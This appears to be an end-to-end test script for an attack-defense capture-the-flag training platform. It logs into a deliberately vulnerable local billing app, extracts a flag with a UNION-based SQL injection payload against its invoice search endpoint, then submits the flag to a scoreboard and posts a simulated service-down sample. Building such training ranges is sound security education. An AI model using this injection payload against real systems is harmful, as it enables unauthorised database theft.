#!/usr/bin/env node
/**
 * Phase 4 e2e: planter → SQLi steal → submit → scoreboard; checker SLA up then down.
 * Requires: scoreboard :3020, metadata :3099, app2 vuln :3011, DBs up.
 */
import { extractFlag } from '../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const scoreboard = arg('scoreboard', 'http://127.0.0.1:3020').replace(/\/$/, '');
const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');
const teamToken = arg('token', 'team-b-token'); // INTENTIONALLY WEAK — training only
const judge = arg('judge', 'judge-token');

async function mustOk(label, res) {
  if (!res.ok) {
    console.error('FAIL', label, res.status, await res.text());
    process.exit(1);
  }
}

// 1) Plant once via planter HTTP path is external; here we assume planter --once already ran
//    OR we trigger tick+plant by shell. This script expects flags already planted.
//    If --plant-url given, call planter is N/A; we just steal current sqli flag.

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'alice', password: 'alice123' }),
}).then((r) => r.json());

const q = "' UNION SELECT id, name, 0, 'open', value FROM secret_flags--";
const steal = await fetch(`${base}/api/invoices?q=${encodeURIComponent(q)}`, {
  headers: { Authorization: `Bearer ${login.token}` },
});
const stealText = await steal.text();
let flag = null;
try {
  const data = JSON.parse(stealText);
  const row = data.invoices?.find((i) => i.title === 'sqli_flag');
  if (row) flag = extractFlag(JSON.stringify(row));
} catch {
  /* ignore */
}
if (!flag) flag = extractFlag(stealText);
if (!flag) {
  console.error('FAIL: no flag stolen — wait for flag-planter tick or run planter');
  console.error(stealText.slice(0, 300));
  process.exit(1);
}
console.log('stolen flagFp', `${flag.slice(0, 8)}…`);

const submit = await fetch(`${scoreboard}/api/submit`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Team-Token': teamToken,
  },
  body: JSON.stringify({ team: 'b', flag }),
});
const submitBody = await submit.json();
console.log('submit', submitBody);
if (submitBody.status !== 'accepted' || !(submitBody.points > 0)) {
  console.error('FAIL: submit did not accept');
  process.exit(1);
}

const board = await fetch(`${scoreboard}/api/scoreboard`).then((r) => r.json());
const teamB = board.teams?.find((t) => t.team === 'b');
if (!teamB || teamB.attack < submitBody.points) {
  console.error('FAIL: scoreboard attack points not updated', board.teams);
  process.exit(1);
}
console.log('PASS submit→board', { attack: teamB.attack, total: teamB.total });

// SLA: record up then verify down path by posting synthetic down after killing is optional.
// Checker --once should have written samples; ensure at least we can POST sla down.
const slaDown = await fetch(`${scoreboard}/api/internal/sla`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Judge-Token': judge,
  },
  body: JSON.stringify({
    team: 'a',
    service: 'app2-billing',
    tick: board.round?.current_tick ?? 1,
    status: 'down',
    latency_ms: 0,
    detail: { reason: 'phase4-e2e-sim' },
  }),
});
await mustOk('sla down', slaDown);

const board2 = await fetch(`${scoreboard}/api/scoreboard`).then((r) => r.json());
const teamA = board2.teams?.find((t) => t.team === 'a');
console.log('team a after down sample', teamA);
console.log('PASS Phase 4 e2e core (steal→submit→board + SLA sample)');
